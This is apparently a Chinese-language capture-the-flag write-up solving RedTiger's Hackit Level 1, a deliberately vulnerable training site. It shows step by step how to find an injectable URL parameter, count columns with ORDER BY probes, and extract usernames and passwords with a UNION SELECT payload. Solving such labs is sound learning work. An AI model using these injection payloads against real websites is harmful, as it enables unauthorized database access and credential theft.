## [[RedTiger's Hackit](http://redtiger.labs.overthewire.org/)] [[Level 01 - Simple SQL-Injection](http://redtiger.labs.overthewire.org/level1.php)] [[解题报告](http://exp-blog.com/2019/05/25/pid-3801/)]

------

## 题目分析

作为第一题反而不算太水，估计有些同学在这里会卡关。

首先读懂题意：通过 SQL 注入找到用户 `Hornoxe` 的登陆密码，明确告知了用户表的表名是 `level1_users` 。

> 虽然不知道 level1_users 的列名，但是账密输入框的名称暗示了有两个列名是 `username` 和 `password` 。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/redtigers-hackit/Level%2001%20-%20Simple%20SQL-Injection/imgs/01.png)

------

## 找到注入点

测试了集中方法，`username` 和 `password` 输入框不是注入点。

注入点其实在 [`Category: 1`](http://redtiger.labs.overthewire.org/level1.php?cat=1)

点击后 url 多了一个参数 `cat=1` ，同时页面会回显三个查询值：

```
This hackit is cool :)
My cats are sweet.
Miau
```

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/redtigers-hackit/Level%2001%20-%20Simple%20SQL-Injection/imgs/02.png)

尝试把 url 的 `cat=1` 更改成  `cat=2` ，此时页面回显的查询值为：`This category does not exist! `

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/redtigers-hackit/Level%2001%20-%20Simple%20SQL-Injection/imgs/03.png)

据此推测此处的 SQL 语句为：

```sql
select [col1], [col2], ...... from [data_table] where category = $_GET['cat']
```

------

### 试错

这种题型其实很好注入，通过 `union` 关联查询用户表 `level1_users` 就可以，例如：

```sql
select [col1], [col2], ...... from [data_table] where category = 1 union select username, password from level1_users
```

> 这里假设数据表表名为 `data_table`，列名为 `col1`、 `col2`、......

亦即 payload 可能为：`1 union select username, password from level1_users`

测试下 payload 效果，但是页面回显为 `This category does not exist! `

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/redtigers-hackit/Level%2001%20-%20Simple%20SQL-Injection/imgs/04.png)

因为 `union` 有个特性，关联查询的两张表列数必须一致，因此推测查询失败可能是因为列数不一致导致的。

但是我们不知道数据表 `data_table` 的列数，也不知道列名。

这里可以利用 `oder by` 的几个特性：

- `oder by` 可以对多列排序
- `oder by` 排序的列必须出现在 `select` 的列中
- `oder by` 可以使用列名，也可以使用列索引（列索引是从 1 开始的）

根据这几个特性，就可以探测数据表 `data_table` 的列数。

于是我们构造探针如下：

- `1 order by 1`
- `1 order by 1, 2`
- `1 order by 1, 2, 3`
- `1 order by 1, 2, 3, 4`
- `1 order by 1, 2, 3, 4, 5`

不难发现，把 1、2、3、4 列放到 `oder by` 中排序都可以查询到数据，而当第 5 列出现之后，就会查询失败。

说明数据表 `data_table` 的第  1、2、3、4 列都被查询了（具体的列名不用关心），亦即是说在用 `union` 关联查询时，也要查询 4 列。

> 当然这个说明的逻辑不是完全严密的，数据表 `data_table` 可能只有第 5 列没有被查询，而第 6 列被查询了，也会出现这种情况。不过这种事情只要多测试几次就可以探测出来了，故而不再啰嗦。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/redtigers-hackit/Level%2001%20-%20Simple%20SQL-Injection/imgs/05.png)
![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/redtigers-hackit/Level%2001%20-%20Simple%20SQL-Injection/imgs/06.png)

------

## 构造 payload

既然已经知道数据表 `data_table` 被查询了 4 列，这里重新构造 payload 如下：

`1 union select 1, 2, 3, 4 from level1_users`

试一下效果，很明显这次可以查询到数据，而且虽然我们查询了4 列，但是只有第 3 和第 4 列被回显到页面：

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/redtigers-hackit/Level%2001%20-%20Simple%20SQL-Injection/imgs/07.png)

很自然我们可以利用第 3、4 列去查询目标用户名和密码，最终构造 payload 如下：

`1 union select 1, 2, username, password from level1_users`

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/redtigers-hackit/Level%2001%20-%20Simple%20SQL-Injection/imgs/08.png)

成功得到账密，完成挑战。

输入账密后得到 flag 和 跳关密码。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/redtigers-hackit/Level%2001%20-%20Simple%20SQL-Injection/imgs/09.png)


------

## 版权声明

　[![Copyright (C) EXP,2016](https://img.shields.io/badge/Copyright%20(C)-EXP%202016-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
